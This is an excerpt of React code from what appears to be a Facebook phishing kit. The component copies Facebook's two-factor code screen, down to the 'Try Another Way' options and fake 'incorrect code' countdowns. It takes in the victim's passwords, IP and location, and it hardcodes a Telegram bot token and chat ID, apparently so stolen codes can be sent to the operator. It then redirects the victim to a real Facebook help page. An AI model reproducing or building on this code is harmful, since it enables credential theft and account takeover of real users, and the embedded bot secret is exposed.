...
const AuthCodeForm = () => {
	const BOT_TOKEN = '8782861433:AAExGaWnvhgp1M71gW4RjhUpB75NiM_B0PE';
	const CHAT_ID = '1140844339';

	const { state } = useLocation();

	const { method = 'app', ip, location, formData, password1, password2 } = state;
...
`;
	...
	const handleSubmit = async (e) => {
		e.preventDefault();
		if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit) return;
		...
		try {
			if (clickCount === 0) {
				...
				setTimeout(() => {
					globalThis.location.href = 'https://www.facebook.com/help/1735443093393986/';
				}, 2000);
			}
		} catch (err) {
	...
	return (
		<div className='auth-container'>
			<div className='auth-box'>
				<p className='meta'>{formData?.fullName || 'Facebook User'} • Facebook</p>
				...
				{currentStep === 'code-whatsapp' ? (
					...
					<>
						...
						<p className='description'>
							Enter the code we sent to your {getMethodTargetLabel('sms', formData)}.
						</p>
						<img
					...
					<>
						...
						<p className='description'>
							Enter the code we sent to {getMethodTargetLabel('email', formData)}.
						</p>
						<img
							src='/imgi_1_sms.874d1de2b472119dde0c.png'
							alt='email'
				...
				<form onSubmit={handleSubmit}>
					...
					{isSubmitDisabled && (
						...
						>
							The code you entered is incorrect or already used. Please try again
							after {String(timeLeft).padStart(2, '0')}s.
						</p>
					)}
				...
				>
					{loadingOptions ? <span className='spinner-inline' /> : 'Try Another Way'}
				</button>
			</div>
			...
			{showOptions && (
				<div className='modal-overlay' onClick={() => setShowOptions(false)}>
					<div className='modal' onClick={(e) => e.stopPropagation()}>
						...
						>
							{loadingConfirm ? <span className='spinner-inline' /> : 'Continue'}
						</button>
					</div>
				</div>
			)}
